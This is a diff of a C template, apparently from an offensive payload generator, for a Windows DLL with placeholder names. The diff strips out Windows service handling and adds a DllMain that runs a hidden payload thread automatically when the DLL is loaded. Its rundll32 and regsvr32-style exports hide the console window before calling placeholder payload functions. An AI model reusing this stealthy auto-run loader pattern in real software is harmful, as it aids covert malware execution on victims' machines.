@@ -57,21 +57,10 @@
 
 #include "flurry.h"
 
-HANDLE G_event;
-SERVICE_STATUS_HANDLE G_svc;
-SERVICE_STATUS G_status = {
-    SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING,
-    SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE
-};
 
-DWORD $thread(LPVOID e) {
-    while (e == NULL || WaitForSingleObject(e, 0) != 0) {
-        $export();
-        Sleep($timeout);
-    }
-    if (e != NULL) {
-        CloseHandle(e);
-    }
+DWORD $thread() {
+    Sleep(1000);
+    $export();
     return 0;
 }
 
@@ -80,7 +69,7 @@ EXPORT HRESULT WINAPI VoidFunc() {
     if (c != NULL) {
         ShowWindow(c, 0);
     }
-    $export();
+    $secondary();
 }
 EXPORT HRESULT WINAPI DllRegisterServer() {
     HANDLE c = GetConsoleWindow();
@@ -109,47 +98,12 @@ EXPORT void $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
     if (c != NULL) {
         ShowWindow(c, 0);
     }
-    $export();
+    $secondary();
 }
 
 EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
+    if (r == DLL_PROCESS_ATTACH) {
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)$thread, NULL, 0, NULL);
+    }
     return TRUE;
-}
-
-EXPORT DWORD WINAPI HandlerEx(DWORD c, DWORD e, LPVOID d, LPVOID x) {
-    switch (c) {
-    case SERVICE_CONTROL_STOP:
-        G_status.dwCurrentState = SERVICE_STOPPED;
-        SetEvent(G_event);
-        break;
-    case SERVICE_CONTROL_PAUSE:
-        G_status.dwCurrentState = SERVICE_PAUSED;
-        break;
-    case SERVICE_CONTROL_CONTINUE:
-        G_status.dwCurrentState = SERVICE_RUNNING;
-        break;
-    case SERVICE_CONTROL_SHUTDOWN:
-        G_status.dwCurrentState = SERVICE_STOPPED;
-        SetEvent(G_event);
-        break;
-    default:
-        break;
-    }
-    SetServiceStatus(G_svc, &G_status);
-    return NO_ERROR;
-}
-
-EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR* a) {
-    G_event = CreateEventW(NULL, TRUE, FALSE, NULL);
-    if (G_event == NULL) {
-        return;
-    }
-    G_svc = RegisterServiceCtrlHandlerExW(L"$name", HandlerEx, NULL);
-    if (G_svc == NULL) {
-        return;
-    }
-    G_status.dwCurrentState = SERVICE_RUNNING;
-    SetServiceStatus(G_svc, &G_status);
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)$thread, G_event, 0, NULL);
-    WaitForSingleObject(G_svc, INFINITE);
 }
